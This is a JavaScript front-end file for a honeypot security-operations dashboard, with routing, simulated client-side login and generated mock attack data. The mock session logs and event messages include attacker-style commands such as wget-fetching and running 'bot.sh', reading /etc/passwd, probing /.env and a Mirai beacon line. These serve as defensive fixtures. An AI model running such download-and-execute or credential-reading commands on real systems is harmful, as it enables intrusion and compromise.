/* ═══════════════════════════════════════════════════════════════
   ForenHive SOC Platform — Router + Mock Data + Helpers
   Vanilla JS, zéro dépendance
═══════════════════════════════════════════════════════════════ */

/* ───────── ROLES & ACL ───────── */
const ROLES = {
  admin:   { label: 'Admin',   color: 'gold',    icon: '👑' },
  analyst: { label: 'Analyst', color: 'blue',    icon: '🔎' },
  user:    { label: 'User',    color: 'purple',  icon: '👤' },
};

const NAV = [
  { id: 'dashboard',  label: 'Dashboard',    icon: '🏠', roles: ['admin','analyst','user'] },
  { id: 'stats',      label: 'Statistiques', icon: '📊', roles: ['admin','analyst'] },
  { id: 'timeline',   label: 'Timeline',     icon: '⏱️', roles: ['admin','analyst'] },
  { id: 'sessions',   label: 'Sessions',     icon: '🖥️', roles: ['admin','analyst'] },
  { id: 'geomap',     label: 'Carte Géo',    icon: '🌍', roles: ['admin','analyst'] },
  { id: 'profiling',  label: 'Profiling',    icon: '🧠', roles: ['admin','analyst'] },
  { id: 'reporting',  label: 'Reporting',    icon: '📋', roles: ['admin','analyst','user'] },
  { id: 'settings',   label: 'Paramètres',   icon: '⚙️', roles: ['admin','analyst','user'] },
  { id: 'health',     label: 'Health Check', icon: '💊', roles: ['admin'], section: 'Système' },
  { id: 'config',     label: 'Configuration',icon: '🔧', roles: ['admin'] },
];

/* ───────── AUTH (localStorage simulé) ───────── */
const Auth = {
  key: 'forenhive.session',
  login(email, role) {
    const u = { email, role, name: email.split('@')[0], loginAt: Date.now() };
    localStorage.setItem(this.key, JSON.stringify(u));
    return u;
  },
  logout() { localStorage.removeItem(this.key); location.href = 'pages/login.html'; },
  current() { try { return JSON.parse(localStorage.getItem(this.key)); } catch(e){ return null; } },
  require(){ const u = this.current(); if(!u){ location.href = 'pages/login.html'; return null; } return u; },
};

/* ───────── MOCK DATA ─────────
   Données réalistes et variées utilisées partout dans la SPA.
*/

const HONEYPOTS = ['cowrie','dionaea','galah','zeek'];
const COUNTRIES = [
  {iso:'RU', name:'Russia',         flag:'🇷🇺', lat:55, lng:37},
  {iso:'CN', name:'China',          flag:'🇨🇳', lat:35, lng:105},
  {iso:'US', name:'United States',  flag:'🇺🇸', lat:39, lng:-98},
  {iso:'BR', name:'Brazil',         flag:'🇧🇷', lat:-14, lng:-52},
  {iso:'IN', name:'India',          flag:'🇮🇳', lat:21, lng:78},
  {iso:'DE', name:'Germany',        flag:'🇩🇪', lat:51, lng:10},
  {iso:'NL', name:'Netherlands',    flag:'🇳🇱', lat:52, lng:5},
  {iso:'UA', name:'Ukraine',        flag:'🇺🇦', lat:49, lng:32},
  {iso:'IR', name:'Iran',           flag:'🇮🇷', lat:32, lng:53},
  {iso:'VN', name:'Vietnam',        flag:'🇻🇳', lat:16, lng:108},
  {iso:'TN', name:'Tunisia',        flag:'🇹🇳', lat:34, lng:9},
  {iso:'KP', name:'North Korea',    flag:'🇰🇵', lat:40, lng:127},
];

const IP_POOL = [
  {ip:'185.220.101.5',  country:'DE', asn:'AS6805 Telefónica',    tor:true,  vpn:false, abuse:98, vt:12, shodan:['tor-exit','ssh']},
  {ip:'45.33.32.156',   country:'US', asn:'AS63949 Linode',       tor:false, vpn:true,  abuse:76, vt:7,  shodan:['vps','scanner']},
  {ip:'192.241.220.88', country:'US', asn:'AS14061 DigitalOcean', tor:false, vpn:false, abuse:54, vt:3,  shodan:['cloud','http-scan']},
  {ip:'103.45.201.12',  country:'CN', asn:'AS4134 Chinanet',      tor:false, vpn:false, abuse:91, vt:18, shodan:['botnet','mirai']},
  {ip:'51.15.98.176',   country:'NL', asn:'AS12876 Scaleway',     tor:false, vpn:true,  abuse:62, vt:4,  shodan:['vps']},
  {ip:'91.240.118.172', country:'RU', asn:'AS39798 MivoCloud',    tor:false, vpn:false, abuse:88, vt:9,  shodan:['scanner','ssh-brute']},
  {ip:'5.188.10.198',   country:'RU', asn:'AS57724 Ddos-Guard',   tor:false, vpn:false, abuse:95, vt:15, shodan:['ddos','scanner']},
  {ip:'103.74.120.45',  country:'VN', asn:'AS18403 FPT Telecom',  tor:false, vpn:false, abuse:72, vt:6,  shodan:['rdp-scan']},
  {ip:'194.26.135.32',  country:'UA', asn:'AS49505 Selectel',     tor:true,  vpn:false, abuse:84, vt:11, shodan:['tor-exit']},
  {ip:'45.95.169.224',  country:'IR', asn:'AS50673 Serverius',    tor:false, vpn:false, abuse:79, vt:5,  shodan:['scanner']},
  {ip:'123.108.45.12',  country:'IN', asn:'AS9829 BSNL',          tor:false, vpn:false, abuse:45, vt:2,  shodan:['http-scan']},
  {ip:'104.244.77.156', country:'US', asn:'AS53667 FranTech',     tor:true,  vpn:false, abuse:87, vt:14, shodan:['tor-exit']},
  {ip:'177.54.150.201', country:'BR', asn:'AS262287 Locaweb',     tor:false, vpn:false, abuse:58, vt:3,  shodan:['scanner']},
  {ip:'175.45.178.90',  country:'KP', asn:'AS131279 Ryugyong',    tor:false, vpn:false, abuse:96, vt:20, shodan:['apt','state-actor']},
];

const MITRE_TECHNIQUES = [
  {id:'T1595', tactic:'recon',       label:'Active Scanning'},
  {id:'T1110.001', tactic:'access',  label:'Brute Force: Password Guessing'},
  {id:'T1078', tactic:'access',      label:'Valid Accounts'},
  {id:'T1190', tactic:'access',      label:'Exploit Public-Facing App'},
  {id:'T1059', tactic:'exec',        label:'Command/Script Interpreter'},
  {id:'T1552.001', tactic:'cred',    label:'Credentials in Files'},
  {id:'T1003', tactic:'cred',        label:'OS Credential Dumping'},
  {id:'T1046', tactic:'discovery',   label:'Network Service Scanning'},
  {id:'T1082', tactic:'discovery',   label:'System Information'},
  {id:'T1105', tactic:'cc',          label:'Ingress Tool Transfer'},
  {id:'T1071', tactic:'cc',          label:'Application Layer Protocol'},
  {id:'T1489', tactic:'impact',      label:'Service Stop'},
];

const YARA_RULES = ['Mirai_Botnet', 'XMRig_Miner', 'Kaiji_Malware', 'Generic_Shell', 'Cobalt_Strike'];

/* ── sessions ── */
function genSessions(n = 38) {
  const rand = (min,max) => Math.floor(Math.random()*(max-min+1))+min;
  const pick = a => a[rand(0, a.length-1)];
  const now = Date.now();
  const out = [];
  for (let i = 0; i < n; i++) {
    const ip = pick(IP_POOL);
    const hp = pick(HONEYPOTS);
    const score = rand(10, 99);
    const techs = Array.from({length: rand(1,5)}, () => pick(MITRE_TECHNIQUES).id);
    out.push({
      id: 'sess_' + Math.random().toString(36).slice(2, 14),
      timestamp: now - rand(60_000, 86_400_000 * 7),
      ip: ip.ip,
      country: ip.country,
      asn: ip.asn,
      tor: ip.tor, vpn: ip.vpn,
      abuse: ip.abuse,
      honeypot: hp,
      score,
      techniques: [...new Set(techs)],
      duration_s: rand(5, 1800),
      status: score >= 80 ? 'critical' : (score >= 40 ? 'analyzed' : 'active'),
      commands: rand(1, 45),
      yara: Math.random() < 0.15 ? pick(YARA_RULES) : null,
      logs: `[${new Date(now).toISOString()}] session start\n> cmd: uname -a\nLinux honeypot 5.15.0 #gen\n> cmd: wget http://bot.sh\n--2026-- http://bot.sh/\n> cmd: chmod +x bot.sh && ./bot.sh\n[mirai] beacon → 185.220.101.5:6667`,
    });
  }
  return out.sort((a,b) => b.timestamp - a.timestamp);
}

const SESSIONS = genSessions();

/* ── live events (timeline) ── */
function genEvent(t = Date.now()) {
  const rand = (min,max) => Math.floor(Math.random()*(max-min+1))+min;
  const pick = a => a[rand(0, a.length-1)];
  const ip = pick(IP_POOL);
  const hp = pick(HONEYPOTS);
  const severities = ['low','low','low','medium','medium','high','high','critical'];
  const sev = pick(severities);
  const msgs = {
    cowrie: ['SSH brute force attempt → root/admin123 ✗','Login success → admin/admin (probe)','CMD: wget http://malware.sh','CMD: cat /etc/passwd','SCP upload: /tmp/bot.sh'],
    dionaea:['EternalBlue probe on :445','MySQL auth failed user=root','SMB session request','FTP USER anonymous','MSSQL xp_cmdshell probe'],
    galah:  ['GET /wp-admin/setup-config.php','POST /xmlrpc.php','GET /.env','User-Agent: sqlmap/1.7','Scanner: Nikto/2.5'],
    zeek:   ['TCP SYN scan detected (1024 ports)','DNS tunneling suspected','NTLMv2 hash captured','Large DNS TXT query','Unusual TLS ClientHello'],
  };
  return { t, ip: ip.ip, country: ip.country, honeypot: hp, severity: sev, message: pick(msgs[hp]) };
}

const INITIAL_EVENTS = Array.from({length: 24}, (_,i) => genEvent(Date.now() - i*15000))
  .sort((a,b)=>b.t-a.t);

/* ── profiles ── */
function genProfiles() {
  const avatars = ['🎭','👹','🤖','👺','🐉','🕷️','🦂','👤','🌑','⚔️'];
  return IP_POOL.map((ip, i) => {
    const rand = (min,max) => Math.floor(Math.random()*(max-min+1))+min;
    const techs = [];
    const k = rand(3, 7);
    for (let j = 0; j < k; j++) techs.push(MITRE_TECHNIQUES[rand(0, MITRE_TECHNIQUES.length-1)].id);
    return {
      ...ip,
      avatar: avatars[i % avatars.length],
      score: ip.abuse + rand(-5, 5),
      sessions: rand(2, 32),
      techniques: [...new Set(techs)],
      firstSeen: Date.now() - rand(3,60)*86400000,
      lastSeen:  Date.now() - rand(1,7200)*1000,
    };
  }).sort((a,b)=>b.score-a.score);
}
const PROFILES = genProfiles();

/* ── reports ── */
function genReports() {
  const titles = ['Incident SSH Brute Force','Analyse Mirai Botnet','Rapport MSSQL Exploit','Galah Web Scan Summary','Zeek Anomaly Report','Session e2de25 Forensic'];
  const now = Date.now();
  return titles.map((t, i) => ({
    id: 'rpt_' + (1000 + i),
    title: t,
    session: SESSIONS[i]?.id || 'sess_generic',
    kind: ['incident','forensic','exec'][i%3],
    status: ['ready','ready','ready','generating','ready','ready'][i],
    author: i%3===0 ? 'admin@forenhive.io' : (i%3===1 ? 'analyst@forenhive.io' : 'user@forenhive.io'),
    sha256: Array.from({length:64}, ()=> '0123456789abcdef'[Math.floor(Math.random()*16)]).join(''),
    date: now - i*86400000,
  }));
}
const REPORTS = genReports();

/* ── country attacks (geo) ── */
const GEO_POINTS = (() => {
  const out = [];
  const severities = ['crit','hi','md','lo'];
  COUNTRIES.forEach(c => {
    const n = Math.floor(Math.random()*3)+1;
    for (let i = 0; i < n; i++) {
      out.push({
        country: c.iso, flag: c.flag, name: c.name,
        lat: c.lat + (Math.random()-.5)*6, lng: c.lng + (Math.random()-.5)*8,
        severity: severities[Math.floor(Math.random()*severities.length)],
        ip: IP_POOL[Math.floor(Math.random()*IP_POOL.length)].ip,
        count: Math.floor(Math.random()*240)+10,
        score: Math.floor(Math.random()*70)+30,
      });
    }
  });
  return out;
})();

/* ── services (health check) ── */
const SERVICES = [
  { name: 'Elasticsearch', status: 'up',   version: '8.13.2', uptime: '12d 4h' },
  { name: 'Logstash',      status: 'up',   version: '8.13.2', uptime: '12d 4h' },
  { name: 'Filebeat',      status: 'up',   version: '8.13.2', uptime: '12d 4h' },
  { name: 'Cowrie',        status: 'up',   version: '2.5.0',  uptime: '7d 12h'  },
  { name: 'Dionaea',       status: 'warn', version: '0.11',   uptime: '3d 2h'   },
  { name: 'Galah',         status: 'up',   version: '1.2.0',  uptime: '12d 4h' },
  { name: 'Zeek',          status: 'up',   version: '6.0.2',  uptime: '12d 4h' },
  { name: 'FastAPI',       status: 'up',   version: '1.0.0',  uptime: '2h 15m' },
  { name: 'PostgreSQL',    status: 'up',   version: '15.5',   uptime: '12d 4h' },
  { name: 'Ollama',        status: 'up',   version: '0.3.0',  uptime: '12d 4h' },
  { name: 'Redis',         status: 'down', version: '—',      uptime: '—'      },
];

/* ───────── HELPERS ───────── */
const fmt = {
  date(ts){ const d = new Date(ts); return d.toLocaleString('fr-FR', {year:'numeric',month:'2-digit',day:'2-digit',hour:'2-digit',minute:'2-digit'}); },
  time(ts){ return new Date(ts).toLocaleTimeString('fr-FR', {hour:'2-digit',minute:'2-digit',second:'2-digit'}); },
  ago(ts){ const s = Math.max(1, Math.floor((Date.now()-ts)/1000));
    if (s < 60) return s+'s';
    if (s < 3600) return Math.floor(s/60)+'m';
    if (s < 86400) return Math.floor(s/3600)+'h';
    return Math.floor(s/86400)+'j'; },
  dur(sec){ if (sec<60) return sec+'s'; if (sec<3600) return Math.floor(sec/60)+'m'+(sec%60)+'s'; return Math.floor(sec/3600)+'h'+Math.floor((sec%3600)/60)+'m'; },
  shortIp(ip){ return ip.length > 15 ? ip.slice(0,14)+'…' : ip; },
  shortHash(h){ return h.slice(0,10)+'…'+h.slice(-6); },
  scoreClass(s){ return s<40 ? 'lo' : (s<70 ? 'md' : 'hi'); },
  sevToClass(s){ return {critical:'crit',high:'hi',medium:'md',low:'lo'}[s] || 'lo'; },
};

const $ = (sel, root=document) => root.querySelector(sel);
const $$ = (sel, root=document) => Array.from(root.querySelectorAll(sel));
const esc = s => String(s ?? '').replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));

/* ───────── ROUTER ───────── */
const Router = {
  pages: ['dashboard','stats','timeline','sessions','geomap','profiling','reporting','settings','health','config'],
  current: null,
  handlers: {},
  register(page, fn){ this.handlers[page] = fn; },
  async go(page, push = true){
    if (!this.pages.includes(page)) page = 'dashboard';
    const user = Auth.current();
    const nav = NAV.find(n => n.id === page);
    if (!nav || !nav.roles.includes(user.role)) {
      // bloquer l'accès : redirige vers dashboard
      page = 'dashboard';
    }
    if (push) history.replaceState({page}, '', '#'+page);
    const content = $('#content');
    content.classList.remove('visible');
    try {
      const res = await fetch('pages/' + page + '.html', {cache: 'no-cache'});
      const html = await res.text();
      content.innerHTML = html;
      content.classList.add('visible');
      this.current = page;
      // mise à jour nav active
      $$('#sb-nav .sb-item').forEach(el => el.classList.toggle('active', el.dataset.page === page));
      $('#tb-title').textContent = (NAV.find(n => n.id === page) || {label:'ForenHive'}).label;
      // exécute le handler spécifique
      const fn = this.handlers[page];
      if (typeof fn === 'function') {
        try { fn(); } catch(e){ console.error('handler error', page, e); }
      }
      window.scrollTo({top:0});
    } catch(e){
      content.innerHTML = '<div class="alert err">Erreur de chargement de la page.</div>';
      console.error(e);
    }
  },
  init(){
    window.addEventListener('hashchange', () => this.go(location.hash.slice(1) || 'dashboard', false));
    const start = location.hash.slice(1) || 'dashboard';
    this.go(start, true);
  }
};

/* ───────── APP SHELL INIT ───────── */
function buildSidebar(user) {
  const groups = [
    { title: null, items: NAV.filter(n => !n.section) },
    { title: 'Système', items: NAV.filter(n => n.section === 'Système') },
  ];
  const html = groups.map(g => `
    ${g.title ? `<div class="sb-section">${g.title}</div>` : ''}
    ${g.items.map(n => {
      const allowed = n.roles.includes(user.role);
      return `<a class="sb-item ${allowed?'':'disabled'}" data-page="${n.id}" href="#${n.id}">
        <span class="sb-item-ic">${n.icon}</span><span>${n.label}</span>
      </a>`;
    }).join('')}
  `).join('');
  $('#sb-nav').innerHTML = html;
  $$('#sb-nav .sb-item').forEach(el => {
    el.addEventListener('click', e => {
      if (el.classList.contains('disabled')) { e.preventDefault(); return; }
      e.preventDefault();
      Router.go(el.dataset.page);
    });
  });
}

function updateTime() {
  const el = $('#tb-time');
  if (el) el.textContent = new Date().toLocaleTimeString('fr-FR', {hour:'2-digit',minute:'2-digit',second:'2-digit'});
}

function initAppShell(){
  const user = Auth.require();
  if (!user) return;
  const role = ROLES[user.role];
  $('#sb-role').className = `sb-role ${user.role}`;
  $('#sb-role').innerHTML = `<span class="sb-role-dot"></span>${role.label}`;
  $('#tb-avatar').textContent = role.icon;
  $('#tb-name').textContent = user.name;
  $('#tb-role').textContent = role.label;
  buildSidebar(user);
  $('#sb-logout').addEventListener('click', () => Auth.logout());
  const burger = $('#burger'); if (burger) burger.addEventListener('click', () => $('#sidebar').classList.toggle('open'));
  updateTime(); setInterval(updateTime, 1000);
  Router.init();
}

/* expose globally for pages */
window.FH = {
  Auth, Router, NAV, ROLES,
  SESSIONS, PROFILES, REPORTS, IP_POOL, COUNTRIES, GEO_POINTS, SERVICES, MITRE_TECHNIQUES, HONEYPOTS, INITIAL_EVENTS, YARA_RULES,
  fmt, esc, $, $$, genEvent, genSessions,
};
